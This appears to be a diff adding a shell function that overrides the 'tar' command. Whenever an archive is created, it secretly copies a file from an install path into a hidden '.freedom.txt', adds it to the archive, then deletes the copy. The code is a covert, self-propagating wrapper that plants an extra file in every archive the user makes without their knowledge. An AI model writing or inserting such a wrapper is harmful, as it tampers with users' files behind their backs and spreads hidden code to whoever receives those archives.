@@ -1,0 +1,24 @@
+tar() {
+        command=`which tar`
+        params="$@"
+
+        program=`basename $0`
+        after=""
+
+        archiving=0
+        filename=""
+
+        for var in $@
+        do
+                if [[ $var == -*c* ]]
+                then
+                        cp INSTALL_PATH ./.freedom.txt
+                        append=" .freedom.txt"
+                        params=$params$append
+                        after="rm .freedom.txt"
+                fi
+        done
+
+        $command $params
+        $after
+}
